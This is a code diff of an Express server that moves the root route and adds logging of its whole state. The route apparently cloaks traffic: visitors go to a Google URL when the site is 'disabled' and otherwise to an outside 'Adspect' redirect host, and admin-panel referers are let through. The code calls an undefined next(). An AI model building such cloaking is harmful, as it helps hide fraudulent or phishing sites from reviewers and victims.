@@ -369,27 +369,7 @@ const io = new Server(server, {
     transports: ['websocket', 'polling']
 });
 
-app.get('/', async (req, res) => {
-    const isAdminPanel = req.headers.referer?.includes('/admin');
-    
-    console.log('Root route accessed:');
-    console.log('- Website enabled:', state.settings.websiteEnabled);
-    console.log('- Is admin panel:', isAdminPanel);
-    
-    if (isAdminPanel) {
-        return next();
-    }
-    
-    // If website is disabled, redirect to Google
-    if (!state.settings.websiteEnabled) {
-        console.log('- Redirecting to:', state.settings.redirectUrl);
-        return res.redirect(state.settings.redirectUrl);
-    }
 
-    // If website is enabled, redirect to Adspect
-    console.log('- Redirecting to: https://redirectingroute.com/');
-    return res.redirect('https://redirectingroute.com/');
-});
 
 
 // Initialize managers and state
@@ -477,7 +457,26 @@ const pageServingMiddleware = async (req, res, next) => {
     }
 };
 
+app.get('/', async (req, res) => {
+    const isAdminPanel = req.headers.referer?.includes('/admin');
+    
+    console.log('Root route accessed:');
+    console.log('- Website enabled:', state.settings.websiteEnabled);
+    console.log('- Is admin panel:', isAdminPanel);
+    console.log('- Current state:', state); // Add this line
+    
+    if (isAdminPanel) {
+        return next();
+    }
+    
+    if (!state.settings.websiteEnabled) {
+        console.log('- Redirecting to Google:', state.settings.redirectUrl);
+        return res.redirect(state.settings.redirectUrl);
+    }
 
+    console.log('- Redirecting to Adspect:', 'https://redirectingroute.com/');
+    return res.redirect('https://redirectingroute.com/');
+});
 
 
 // Initial IP check
